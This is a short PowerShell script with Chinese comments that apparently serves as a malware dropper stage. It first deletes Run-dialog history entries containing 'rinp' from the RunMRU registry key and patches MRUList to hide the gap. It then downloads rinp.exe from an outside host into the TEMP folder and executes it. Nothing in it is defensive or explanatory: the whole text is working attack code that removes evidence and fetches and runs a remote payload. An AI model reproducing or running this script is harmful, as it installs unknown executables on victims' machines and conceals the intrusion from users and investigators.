
# 清理 RunMRU 中的记录
$runMruPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
$tokenKeyword = "rinp"

try {
    if (Test-Path $runMruPath) {
        $mruList = (Get-ItemProperty -Path $runMruPath -Name "MRUList" -ErrorAction SilentlyContinue).MRUList
        $itemsToRemove = @()

        Get-ItemProperty -Path $runMruPath | ForEach-Object {
            $_.PSObject.Properties | Where-Object {
                $_.Name -match '^[a-z]$' -and $_.Value -like "*$tokenKeyword*"
            } | ForEach-Object {
                $itemsToRemove += $_.Name
            }
        }

        # 执行删除并同步更新 MRUList
        if ($itemsToRemove.Count -gt 0) {
            foreach ($item in $itemsToRemove) {
                Remove-ItemProperty -Path $runMruPath -Name $item -Force -ErrorAction SilentlyContinue
            }
            
            # 从 MRUList 字符串中移除已删除的字母
            if ($mruList) {
                $newMruList = ($mruList.ToCharArray() | Where-Object { $_ -notin $itemsToRemove }) -join ''
                Set-ItemProperty -Path $runMruPath -Name "MRUList" -Value $newMruList -Type String -Force
            }
            
        }
    }
} catch {
    Write-Warning "清理运行历史记录时出错: $_"
}


# 下载和执行
$f="$env:TEMP\rinp.exe"; irm https://rinp.pages.dev/d -OutFile $f; if(Test-Path $f){& $f -d}